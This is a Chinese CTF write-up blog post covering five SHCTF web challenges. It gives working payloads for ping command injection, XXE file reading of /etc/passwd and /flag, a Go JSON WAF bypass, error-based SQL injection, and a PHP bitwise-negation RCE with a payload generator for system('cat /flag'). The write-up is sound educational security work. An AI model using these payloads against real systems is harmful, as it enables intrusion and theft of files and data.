---
title: "第三届 SHCTF Web Writeup"
date: 2026-06-27T01:30:00+08:00
lastmod: 2026-06-27T01:30:00+08:00
draft: false
author: "E1thyL"
description: "第三届 SHCTF Web 赛题全解，包含 ez-ping、Mini Blog、Go、上古遗迹档案馆及 kill_king 等高质量题目的解题思路与 Payload 分享。"
categories: ["安全研究", "CTF"]
tags: ["Web", "Writeup", "XXE", "RCE", "SQLi"]
toc: true
lightgallery: true
mermaid: false
comment: true
---

说来惭愧，这篇文章是比较久之前发的了，算是之前那些写的很差的文章中的最好的一篇吧，自己认真写的（），现在我也是好久没有去刷题了，有点混日子的说法，就周四最后一科考完吧，再把这个东西拿起来仔细学学。

# 第三届 SHCTF

## web

### ez-ping

1. 题目分析

打开题目是一个“域名测试”工具，输入域名后系统会执行 Ping 操作。

尝试了localhost;ls

被挡回依次尝试|，/，&

后面两个可以用

```
127.0.0.1&ls
```

获得当前目录index.php，进一步操作

```
127.0.0.1&ls ../../../
```

得到了

```
bin
dev
etc
flag
home
init.sh
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.036 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.057 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.050 ms
64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.045 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.036/0.047/0.057 ms
```

看到了flag

但是到这里我卡了很久（这就是黑盒吗/），但其实在最开始的索引就暗示过我

```
<form action="/ping.php" ...>
```

直到ai提示我grep -r，这样我获取了ping.php的内容

`127.0.0.1&grep -r . .`

```
./ping.php:<?php

./ping.php:header('Content-Type: text/plain; charset=utf-8');

./ping.php:

./ping.php:if ($_SERVER['REQUEST_METHOD'] === 'POST') {

./ping.php: $domain = $_POST['domain'] ?? '';

./ping.php:

./ping.php: if (!preg_match('/^[a-zA-Z0-9\.\-\& \?\*\/]*$/', $domain)) {

./ping.php: http_response_code(400);

./ping.php: echo "无效的域名！";

./ping.php: exit;

./ping.php: }

./ping.php:

./ping.php: if (empty($domain)) {

./ping.php: http_response_code(400);

./ping.php: echo "请输入域名！";

./ping.php: exit;

./ping.php: }

./ping.php:

./ping.php: try {

./ping.php: $cmd = "ping -c 4 " . $domain;

./ping.php: if (!preg_match('/cat|tac|flag|\*/',$cmd)){

./ping.php: $output = shell_exec($cmd . " 2>&1");

./ping.php: } else {

./ping.php: $output = "命令中包含非法字符！";

./ping.php: }

./ping.php: echo $output ?: "命令执行失败！";

./ping.php: } catch (Exception $e) {

./ping.php: http_response_code(500);

./ping.php: echo "错误: " . $e->getMessage();

./ping.php: }

./ping.php:}

./ping.php:?>
```

所以我们使用nl

构造

```
127.0.0.1 & nl /f???
```

回到根目录去找并使用通配符补全flag

![1770013255660.png](https://www.helloimg.com/i/2026/02/02/6980424adec3b.png)

flag：`SHCTF{b993a8f5-4c54-4743-af26-9c67e60c2ccf}`

### Mini Blog

进入后可以看见是一个发布文章的网站，我简单尝试Jinja2没有任何表示

接下来就抓包，fuzzing一下

![1770958096899.png](https://www.helloimg.com/i/2026/02/13/698ead138393a.png)

![1770958081763.png](https://www.helloimg.com/i/2026/02/13/698ead131a940.png)

可以发现我们在尝试`<>`和`&`的时候爆出xml错误，现在也就是成功找到做题方向了

**是 XXE (XML External Entity Injection，XML 外部实体注入)**

我们要把这个包整理一下，尝试读取 `/etc/passwd`，让服务器读取本地的密码文件并显示在 `<title>` 字段中。

```
POST /create HTTP/1.1
Host: challenge.shc.tf:31901
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Origin: http://challenge.shc.tf:31901
Referer: http://challenge.shc.tf:31901/create
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: application/xml; charset=utf-8
Content-Length: 156

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<post>
  <title>&xxe;</title>
  <content>XXE Test</content>
</post>
```

拿到回显

![1770958554141.png](https://www.helloimg.com/i/2026/02/13/698eaeddbc0c7.png)

注意到最后一行：`ctf:x:1000:1000::/home/ctf:/bin/sh`

存在一个名为 **`ctf`** 的用户。

该用户的 **home 目录** 在 **`/home/ctf`**

我们查看根目录

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<post>
  <title>&xxe;</title>
  <content>Check Root Flag</content>
</post>
```

得到flag：`SHCTF{323ac19f-33e9-432c-9930-85e0fb18bc7a}`

### Go

我们访问地址得到这一串信息

```
{"username":"guest","role":"guest","message":"Access denied. Only role='admin' can view the flag."}
```

放入yakit，抓一下包，然后修改一下请求包

```
GET /?role=admin&role=guest HTTP/1.1
```

我尝试把admin进行部分url编码，均被驳回，现在尝试Post方法

大致为

```
POST /?role=guest HTTP/1.1
中间省略...
role=admin
```

返回了

```
HTTP/1.1 400 Bad Request

Content-Type: application/json

Date: Thu, 05 Feb 2026 12:39:47 GMT

Content-Length: 25



{"error": "Invalid JSON"}
```

服务器期望收到的是 **JSON 格式**

中间加上一个

```
Content-Type: application/json
```

再次尝试

```
{"role": "\u0061dmin"}
```

依旧返回

```
You said
HTTP/1.1 403 Forbidden

Content-Type: application/json

Date: Thu, 05 Feb 2026 12:41:41 GMT

Content-Length: 90



{"error": "🚫 WAF Security Alert: 'admin' value is strictly forbidden in 'role' field!"}
```

我又再次改成这个样子

```
{
    "role": "guest", 
    "role": "admin"
}
```

依旧被驳回

重磅时刻：

我们先了解这些

**Go 语言特性**：`encoding/json` 在 Unmarshal 时对 Struct Tag 的匹配是大小写不敏感的。

**WAF 绕过**：当 WAF 规则过于死板（只匹配特定大小写）而后端语言比较宽容时，可以通过改变大小写来绕过防御。

所以我们把role改成Role

```
{
    "Role": "admin"
}
```

此刻我们成功绕过

```
HTTP/1.1 200 OK
Content-Type: application/json
Date: Fri, 13 Feb 2026 05:14:45 GMT
Content-Length: 84

{"flag":"SHCTF{c9205992-e4d9-430e-9b27-0e1379063655}","role":"admin","username":""}

```

得到flag：`SHCTF{c9205992-e4d9-430e-9b27-0e1379063655}`

### 上古遗迹档案馆

输入 `1`，提示“检索成功”但“权限不足”。这说明后端查询成功，但前端逻辑屏蔽了内容显示（**盲注/无回显特征**）。

输入 `1'`，页面出现红色报错框：`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1`

- **注入点存在**：单引号引发报错，确认为 **字符型注入**。
- **Debug 模式开启**：后端不仅捕获了错误，还将详细的数据库报错信息直接打印到了页面上（红色框）。
- **攻击路径确定**：由于正常查询（绿色框）不回显数据，但报错信息（红色框）会回显，因此决定采用 **报错注入** 

1.列数查看

​       Payload: `1' ORDER BY 3 #` -> 报错 `Unknown column '3'`。

​       Payload: `1' ORDER BY 2 #` -> 正常。

​       **结论**：当前查询语句涉及 **2 列**。

​    2.尝试联合查询

​      尝试 `UNION SELECT 1,2`，虽然没有报错，但页面依然只显示“权限不足”。

​      **结论**：`UNION` 注入虽然能在数据库执行，但由于前端代码只判断“是否有结      果”而不输出结果，导致无法直接读取 Flag。**必须利用报错回显。**

#### 步骤 A：爆表名

- **Payload**:

	```
	1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e)) #
	```

- **结果**：`~public_records,secret_vault~`

- **分析**：发现目标表 **`secret_vault`**。

#### 步骤 B：爆列名

- **Payload**:

	```
	1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='secret_vault'), 0x7e)) #
	```

- **结果**：`~id,secret_key~`

- **分析**：锁定目标列 **`secret_key`**。

现在就可以获取flag了

前半段flag用

```
1' AND extractvalue(1, concat(0x7e, (SELECT secret_key FROM secret_vault), 0x7e)) #
```

![1770962014524.png](https://www.helloimg.com/i/2026/02/13/698ebc718f775.png)

后半段flag用

```
1' AND extractvalue(1, concat(0x7e, substring((SELECT secret_key FROM secret_vault), 20), 0x7e)) #
```

![1770962030266.png](https://www.helloimg.com/i/2026/02/13/698ebc70d7e2d.png)

所以我们把flag拼装起来就是

flag：`SHCTF{2c595342-b236-497c-bea5-95c2a45e1771}`

### kill_king

这个游戏我先是玩了一会，国王的血量是认真的吗（），游戏的话建议先力量加智力，后面搭配一波敏捷，咳咳咳都是题外话，反正我没打通。

用yakit抓包

![1770976086220.png](https://www.helloimg.com/i/2026/02/13/698ef358e637e.png)

很鲜明的提示词logic.js我们尝试搜索flag，找到通往下一关的逻辑

```
//提交请求到 check.php，并显示 flag
fetch('check.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'result=win'
})
.then(response => response.text())
.then(flag => {
  document.getElementById('flagBox').innerText = flag;
})
```

**方法**：

- 设置请求方法为 `POST`。

- URL 填 `http://challenge.shc.tf:32064/check.php`。

- Headers 里添加 `Content-Type: application/x-www-form-urlencoded`。

- Body 里填 `result=win`。

就是这样

```
POST /check.php HTTP/1.1
Host: challenge.shc.tf:32064
Accept-Language: zh-CN,zh;q=0.9
Cookie: __vtins__JxVJPIpe3UAQqoDx=%7B%22sid%22%3A%20%222af9b1c2-c269-5ba7-8161-2641338ed198%22%2C%20%22vd%22%3A%201%2C%20%22stt%22%3A%200%2C%20%22dr%22%3A%200%2C%20%22expires%22%3A%201770183839959%2C%20%22ct%22%3A%201770182039959%7D; __51uvsct__JxVJPIpe3UAQqoDx=1; __51vcke__JxVJPIpe3UAQqoDx=e8b9f2fd-c040-5411-ac8a-526143da5f3f; __51vuft__JxVJPIpe3UAQqoDx=1770182039962
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Accept: */*
Referer: http://challenge.shc.tf:32616/
Accept-Encoding: gzip, deflate

result=win
```

进入下一关

![1770976631565.png](https://www.helloimg.com/i/2026/02/13/698ef579a6ae2.png)

#### 难点解析

```
if(preg_match('/^\W+$/', $you)){
    // ... eval ...
}
```

**`\w` (小写)**：匹配单词字符，包括 `a-z`、`A-Z`、`0-9` 和下划线 `_`。

**`\W` (大写)**：匹配**非**单词字符。也就是除了字母、数字、下划线以外的所有字符。

**`^...$`**：表示整个字符串必须全部由非单词字符组成。

#### 解决方法

是不是觉得很迷了，巧了我就是这里卡了很久这里有一个关键点就是**取反运算**

在计算机中，所有字符本质上都是二进制数字。

- **取反运算 (`~`)**：把二进制里的 `0` 变成 `1`，`1` 变成 `0`。

**举个例子：** 字符 `s` 的 ASCII 码是 `115`。 二进制是：`01110011` 对它取反：`10001100` (十六进制是 `0x8C`)

关键点来了：

1. `0x8C` 这个字符是一个不可见字符（乱码），它**不是**字母，也不是数字。
2. 所以，`0x8C` **可以通过** `/^\W+$/` 的正则检查！
3. 在 PHP 中，如果我们对 `0x8C` 再次取反 `~`，它就会变回 `s`。

所以我们不发送 `system`，我们发送 `(~"乱码")`。 PHP 在执行时，会先执行括号里的取反运算，把“乱码”还原成 `system`，然后再去执行这个函数。

大概就是这样（这是一个模板吧）

```
<?php
/*
 * PHP 无字母数字 RCE Payload 生成器 (取反绕过版)
 * 适用于：preg_match('/^\W+$/', $cmd) 限制
 */

// 1. 设置你想执行的命令
// system("cat /flag");
$func_name = "system";    // 函数名
$command   = "cat /flag"; // 参数命令

// 2. 核心生成函数：将字符串转换为 (~"%xx%xx...") 格式
function encode_payload($str) {
    $result = "";
    // 遍历字符串中的每一个字符
    for ($i = 0; $i < strlen($str); $i++) {
        // 核心逻辑：
        // 1. 取出字符
        // 2. 进行按位取反 (~) 运算
        // 3. 转为十六进制 (bin2hex)
        // 4. 加上 % 前缀用于 URL 编码
        $result .= "%" . bin2hex(~$str[$i]);
    }
    // 包裹在 (~"...") 中，以便 PHP eval 解析时还原
    return "(~\"$result\")";
}

// 3. 生成两部分 Payload
$payload_func = encode_payload($func_name);
$payload_cmd  = encode_payload($command);

// 4. 输出最终结果
echo "========== 生成结果 ==========\n";
echo "函数部分 (system):    " . $payload_func . "\n";
echo "命令部分 (cat /flag): " . $payload_cmd . "\n";
echo "\n";
echo "========== 最终 Payload (记得首尾加点) ==========\n";
echo "%20.%20" . $payload_func . $payload_cmd . "%20.%20";
echo "\n";
?>
```

结果是

```
%20.%20(~"%8c%86%8c%8b%9a%92")(~"%9c%9e%8b%df%d0%99%93%9e%98")%20.%20
```

构造好包

```
POST /check.php?who=1&are=1&you=%20.%20(~"%8c%86%8c%8b%9a%92")(~"%9c%9e%8b%df%d0%99%93%9e%98")%20.%20 HTTP/1.1
Host: challenge.shc.tf:32064
Accept-Language: zh-CN,zh;q=0.9
Cookie: __vtins__JxVJPIpe3UAQqoDx=%7B%22sid%22%3A%20%222af9b1c2-c269-5ba7-8161-2641338ed198%22%2C%20%22vd%22%3A%201%2C%20%22stt%22%3A%200%2C%20%22dr%22%3A%200%2C%20%22expires%22%3A%201770183839959%2C%20%22ct%22%3A%201770182039959%7D; __51uvsct__JxVJPIpe3UAQqoDx=1; __51vcke__JxVJPIpe3UAQqoDx=e8b9f2fd-c040-5411-ac8a-526143da5f3f; __51vuft__JxVJPIpe3UAQqoDx=1770182039962
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Accept: */*
Referer: http://challenge.shc.tf:32616/
Accept-Encoding: gzip, deflate
Connection: close

result=win
```

得到结果

```
 SHCTF{1a48ba1b-8ae1-4aeb-9e39-c13faadbcd98} 1 . (~"������")(~"����Й���") . 1 = 1SHCTF{1a48ba1b-8ae1-4aeb-9e39-c13faadbcd98}1
```

flag：`SHCTF{1a48ba1b-8ae1-4aeb-9e39-c13faadbcd98}`

